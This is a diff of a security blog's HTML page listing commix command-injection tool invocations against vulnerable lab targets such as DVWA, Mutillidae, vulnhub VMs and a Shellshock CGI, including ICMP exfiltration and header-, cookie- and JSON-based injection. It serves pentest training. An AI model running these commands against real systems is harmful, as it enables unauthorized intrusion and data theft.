@@ -1,4 +1,142 @@
-<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> commix使用示例 · Z3R0YU</title><meta name="description" content="commix使用示例 - z3r0yu"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://zer0yu.github.io/atom.xml" title="Z3R0YU"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="http://weibo.com/Z3r0yu" target="_blank" class="nav-list-link">WEIBO</a></li><li class="nav-list-item"><a href="https://github.com/zer0yu" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">commix使用示例</h1><div class="post-info">Jan 21, 2017</div><div class="post-content"><h4 id="1-Exploiting-Damn-Vulnerable-Web-App"><a href="#1-Exploiting-Damn-Vulnerable-Web-App" class="headerlink" title="1. Exploiting Damn Vulnerable Web App:"></a>1. Exploiting <a href="http://www.dvwa.co.uk/" target="_blank" rel="external">Damn Vulnerable Web App</a>:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot; --data=&quot;ip=127.0.0.1&amp;submit=submit&quot; --cookie=&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot;</div></pre></td></tr></table></figure>
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="1. Exploiting Damn Vulnerable Web App:1root@kali:~/commix# python commix.py --url=&amp;quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&amp;quot; --data=&amp;quot;ip=127.0.0.1&amp;amp;submit=submit&amp;quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="commix使用示例">
+<meta property="og:url" content="http://zer0yu.github.io/2017/01/21/commix使用示例/index.html">
+<meta property="og:site_name" content="Z3R0YU">
+<meta property="og:description" content="1. Exploiting Damn Vulnerable Web App:1root@kali:~/commix# python commix.py --url=&amp;quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&amp;quot; --data=&amp;quot;ip=127.0.0.1&amp;amp;submit=submit&amp;quot;">
+<meta property="og:updated_time" content="2017-01-21T14:57:55.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="commix使用示例">
+<meta name="twitter:description" content="1. Exploiting Damn Vulnerable Web App:1root@kali:~/commix# python commix.py --url=&amp;quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&amp;quot; --data=&amp;quot;ip=127.0.0.1&amp;amp;submit=submit&amp;quot;">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>commix使用示例</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml" />
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2017/01/21/Commix命令详解/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017/01/21/基于CSI的移动目标侦测研究学习/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2017/01/21/commix使用示例/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2017/01/21/commix使用示例/&text=commix使用示例"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2017/01/21/commix使用示例/&title=commix使用示例"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2017/01/21/commix使用示例/&is_video=false&description=commix使用示例"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=commix使用示例&body=Check out this article: http://zer0yu.github.io/2017/01/21/commix使用示例/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2017/01/21/commix使用示例/&title=commix使用示例"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2017/01/21/commix使用示例/&title=commix使用示例"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2017/01/21/commix使用示例/&title=commix使用示例"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2017/01/21/commix使用示例/&title=commix使用示例"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2017/01/21/commix使用示例/&name=commix使用示例&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Exploiting-Damn-Vulnerable-Web-App"><span class="toc-number">1.</span> <span class="toc-text">1. Exploiting Damn Vulnerable Web App:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Exploiting-php-Charts-1-0-using-injection-payload-suffix-amp-prefix-string"><span class="toc-number">2.</span> <span class="toc-text">2. Exploiting php-Charts 1.0 using injection payload suffix & prefix string:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Exploiting-OWASP-Mutillidae-using-extra-headers-and-HTTP-proxy"><span class="toc-number">3.</span> <span class="toc-text">3. Exploiting OWASP Mutillidae using extra headers and HTTP proxy:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Exploiting-Persistence-using-ICMP-exfiltration-technique"><span class="toc-number">4.</span> <span class="toc-text">4. Exploiting Persistence using ICMP exfiltration technique:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-Exploiting-Persistence-using-an-alternative-python-shell"><span class="toc-number">5.</span> <span class="toc-text">5. Exploiting Persistence using an alternative (python) shell:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-Exploiting-Kioptrix-Level-1-1-2"><span class="toc-number">6.</span> <span class="toc-text">6. Exploiting Kioptrix: Level 1.1 (#2):</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-Exploiting-Kioptrix-2014-5-using-custom-user-agent-and-specified-injection-technique"><span class="toc-number">7.</span> <span class="toc-text">7. Exploiting Kioptrix: 2014 (#5) using custom user-agent and specified injection technique:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-Exploiting-CVE-2014-6271-Shellshock"><span class="toc-number">8.</span> <span class="toc-text">8. Exploiting CVE-2014-6271/Shellshock:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-Exploiting-commix-testbed-cookie-using-cookie-based-injection"><span class="toc-number">9.</span> <span class="toc-text">9. Exploiting commix-testbed (cookie) using cookie-based injection:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-Exploiting-commix-testbed-user-agent-using-ua-based-injection"><span class="toc-number">10.</span> <span class="toc-text">10. Exploiting commix-testbed (user-agent) using ua-based injection:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11-Exploiting-commix-testbed-referer-using-referer-based-injection"><span class="toc-number">11.</span> <span class="toc-text">11. Exploiting commix-testbed (referer) using referer-based injection:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12-Exploiting-Flick-2-using-custom-headers-and-base64-encoding-option"><span class="toc-number">12.</span> <span class="toc-text">12. Exploiting Flick 2 using custom headers and base64 encoding option:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#13-Exploiting-commix-testbed-JSON-based-using-JSON-POST-data"><span class="toc-number">13.</span> <span class="toc-text">13. Exploiting commix-testbed (JSON-based) using JSON POST data:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#14-Exploiting-SickOs-1-1-using-shellshock-module-and-HTTP-proxy"><span class="toc-number">14.</span> <span class="toc-text">14. Exploiting SickOs 1.1 using shellshock module and HTTP proxy:</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        commix使用示例
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Z3R0YU</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2017-01-21T14:53:57.000Z" itemprop="datePublished">2017-01-21</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h4 id="1-Exploiting-Damn-Vulnerable-Web-App"><a href="#1-Exploiting-Damn-Vulnerable-Web-App" class="headerlink" title="1. Exploiting Damn Vulnerable Web App:"></a>1. Exploiting <a href="http://www.dvwa.co.uk/" target="_blank" rel="external">Damn Vulnerable Web App</a>:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot; --data=&quot;ip=127.0.0.1&amp;submit=submit&quot; --cookie=&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot;</div></pre></td></tr></table></figure>
 <h4 id="2-Exploiting-php-Charts-1-0-using-injection-payload-suffix-amp-prefix-string"><a href="#2-Exploiting-php-Charts-1-0-using-injection-payload-suffix-amp-prefix-string" class="headerlink" title="2. Exploiting php-Charts 1.0 using injection payload suffix &amp; prefix string:"></a>2. Exploiting <a href="http://www.exploit-db.com/exploits/25496/" target="_blank" rel="external">php-Charts 1.0</a> using injection payload suffix &amp; prefix string:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=test&quot; --prefix=&quot;&apos;&quot; --suffix=&quot;//&quot;</div></pre></td></tr></table></figure>
 <h4 id="3-Exploiting-OWASP-Mutillidae-using-extra-headers-and-HTTP-proxy"><a href="#3-Exploiting-OWASP-Mutillidae-using-extra-headers-and-HTTP-proxy" class="headerlink" title="3. Exploiting OWASP Mutillidae using extra headers and HTTP proxy:"></a>3. Exploiting <a href="https://www.owasp.org/index.php/Category:OWASP_Mutillidae" target="_blank" rel="external">OWASP Mutillidae</a> using extra headers and HTTP proxy:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php&quot; --data=&quot;target_host=127.0.0.1&quot; --headers=&quot;Accept-Language:fr\nETag:123\n&quot; --proxy=&quot;127.0.0.1:8081&quot;</div></pre></td></tr></table></figure>
 <h4 id="4-Exploiting-Persistence-using-ICMP-exfiltration-technique"><a href="#4-Exploiting-Persistence-using-ICMP-exfiltration-technique" class="headerlink" title="4. Exploiting Persistence using ICMP exfiltration technique:"></a>4. Exploiting <a href="https://www.vulnhub.com/entry/persistence-1,103/" target="_blank" rel="external">Persistence</a> using ICMP exfiltration technique:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --icmp-exfil=&quot;ip_src=192.168.178.5,ip_dst=192.168.178.8&quot;</div></pre></td></tr></table></figure>
@@ -12,4 +150,99 @@
 <h4 id="12-Exploiting-Flick-2-using-custom-headers-and-base64-encoding-option"><a href="#12-Exploiting-Flick-2-using-custom-headers-and-base64-encoding-option" class="headerlink" title="12. Exploiting Flick 2 using custom headers and base64 encoding option:"></a>12. Exploiting <a href="https://www.vulnhub.com/entry/flick-2,122/" target="_blank" rel="external">Flick 2</a> using custom headers and base64 encoding option:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;https://192.168.2.12/do/cmd/*&quot; --headers=&quot;X-UUID:commix\nX-Token:dTGzPdMJlOoR3CqZJy7oX9JU72pvwNEF&quot; --base64</div></pre></td></tr></table></figure>
 <h4 id="13-Exploiting-commix-testbed-JSON-based-using-JSON-POST-data"><a href="#13-Exploiting-commix-testbed-JSON-based-using-JSON-POST-data" class="headerlink" title="13. Exploiting commix-testbed (JSON-based) using JSON POST data:"></a>13. Exploiting <a href="https://github.com/stasinopoulos/commix-testbed/tree/master/scenarios/regular/POST" target="_blank" rel="external">commix-testbed (JSON-based)</a> using JSON POST data:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.11/commix-testbed/scenarios/regular/POST/classic_json.php&quot; --data=&apos;&#123;&quot;addr&quot;:&quot;127.0.0.1&quot;,&quot;name&quot;:&quot;ancst&quot;&#125;&apos;</div></pre></td></tr></table></figure>
 <h4 id="14-Exploiting-SickOs-1-1-using-shellshock-module-and-HTTP-proxy"><a href="#14-Exploiting-SickOs-1-1-using-shellshock-module-and-HTTP-proxy" class="headerlink" title="14. Exploiting SickOs 1.1 using shellshock module and HTTP proxy:"></a>14. Exploiting <a href="https://www.vulnhub.com/entry/sickos-11,132/" target="_blank" rel="external">SickOs 1.1</a> using shellshock module and HTTP proxy:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.8/cgi-bin/status&quot; --shellshock --proxy=&quot;192.168.2.8:3128&quot;`</div></pre></td></tr></table></figure>
-</div></article></div></main><footer><div class="paginator"><a href="/2017/01/21/Commix命令详解/" class="prev">PREV</a><a href="/2017/01/21/基于CSI的移动目标侦测研究学习/" class="next">NEXT</a></div><div class="copyright"><p>© 2015 - 2018 <a href="http://zer0yu.github.io">z3r0yu</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-65933410-1",'auto');ga('send','pageview');</script></body></html>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Exploiting-Damn-Vulnerable-Web-App"><span class="toc-number">1.</span> <span class="toc-text">1. Exploiting Damn Vulnerable Web App:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Exploiting-php-Charts-1-0-using-injection-payload-suffix-amp-prefix-string"><span class="toc-number">2.</span> <span class="toc-text">2. Exploiting php-Charts 1.0 using injection payload suffix & prefix string:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Exploiting-OWASP-Mutillidae-using-extra-headers-and-HTTP-proxy"><span class="toc-number">3.</span> <span class="toc-text">3. Exploiting OWASP Mutillidae using extra headers and HTTP proxy:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Exploiting-Persistence-using-ICMP-exfiltration-technique"><span class="toc-number">4.</span> <span class="toc-text">4. Exploiting Persistence using ICMP exfiltration technique:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-Exploiting-Persistence-using-an-alternative-python-shell"><span class="toc-number">5.</span> <span class="toc-text">5. Exploiting Persistence using an alternative (python) shell:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-Exploiting-Kioptrix-Level-1-1-2"><span class="toc-number">6.</span> <span class="toc-text">6. Exploiting Kioptrix: Level 1.1 (#2):</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-Exploiting-Kioptrix-2014-5-using-custom-user-agent-and-specified-injection-technique"><span class="toc-number">7.</span> <span class="toc-text">7. Exploiting Kioptrix: 2014 (#5) using custom user-agent and specified injection technique:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-Exploiting-CVE-2014-6271-Shellshock"><span class="toc-number">8.</span> <span class="toc-text">8. Exploiting CVE-2014-6271/Shellshock:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-Exploiting-commix-testbed-cookie-using-cookie-based-injection"><span class="toc-number">9.</span> <span class="toc-text">9. Exploiting commix-testbed (cookie) using cookie-based injection:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10-Exploiting-commix-testbed-user-agent-using-ua-based-injection"><span class="toc-number">10.</span> <span class="toc-text">10. Exploiting commix-testbed (user-agent) using ua-based injection:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#11-Exploiting-commix-testbed-referer-using-referer-based-injection"><span class="toc-number">11.</span> <span class="toc-text">11. Exploiting commix-testbed (referer) using referer-based injection:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12-Exploiting-Flick-2-using-custom-headers-and-base64-encoding-option"><span class="toc-number">12.</span> <span class="toc-text">12. Exploiting Flick 2 using custom headers and base64 encoding option:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#13-Exploiting-commix-testbed-JSON-based-using-JSON-POST-data"><span class="toc-number">13.</span> <span class="toc-text">13. Exploiting commix-testbed (JSON-based) using JSON POST data:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#14-Exploiting-SickOs-1-1-using-shellshock-module-and-HTTP-proxy"><span class="toc-number">14.</span> <span class="toc-text">14. Exploiting SickOs 1.1 using shellshock module and HTTP proxy:</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2017/01/21/commix使用示例/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2017/01/21/commix使用示例/&text=commix使用示例"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2017/01/21/commix使用示例/&title=commix使用示例"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2017/01/21/commix使用示例/&is_video=false&description=commix使用示例"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=commix使用示例&body=Check out this article: http://zer0yu.github.io/2017/01/21/commix使用示例/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2017/01/21/commix使用示例/&title=commix使用示例"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2017/01/21/commix使用示例/&title=commix使用示例"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2017/01/21/commix使用示例/&title=commix使用示例"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2017/01/21/commix使用示例/&title=commix使用示例"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2017/01/21/commix使用示例/&name=commix使用示例&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 z3r0yu
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
